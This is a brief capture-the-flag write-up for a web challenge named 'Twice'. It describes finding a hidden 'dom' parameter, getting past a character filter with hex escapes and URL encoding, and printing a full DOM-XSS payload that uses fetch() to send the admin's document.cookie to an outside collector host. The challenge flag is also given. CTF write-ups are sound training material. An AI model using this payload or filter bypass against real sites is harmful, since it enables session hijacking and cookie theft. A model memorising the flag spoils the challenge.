## Twice
### STAGE: JÚLIO NEVES

There's a comment in the page's body: `<!-- /?dom -->`. This URL parameter suggests a DOM-XSS

This parameter is filtered. I can't use `<, >, ", ',  etc.`. 
However, encoding with hex values and URL encoding, the filter is bypassed.
Ex.: `<` becomes `%5Cx3c` and `"` becomes `%5Cx22` (`%5C` = `\`)

A possible payload is: `http://159.65.249.122:4117/?dom=%5Cx3cimg%20src%3D1%20onerror%3Dfetch%28%5Cx22https%3A%2F%2Fenlnhxt5mcmg.x.pipedream.net%2F%3Fq%3D%5Cx22%2Bdocument.cookie%29%20%2F%5Cx3e`
where the dom paramenter is `<img src=1 onerror=fetch(\"https://enlnhxt5mcmg.x.pipedream.net/?q="+document.cookie) />`.

Acessing "our" server, we see the admin's request to it with its cookie! 

*** Flag: HACKAFLAG{Tw1c3_0r_d0ubl3_1ts_th3_s4m3_th1ng} ***


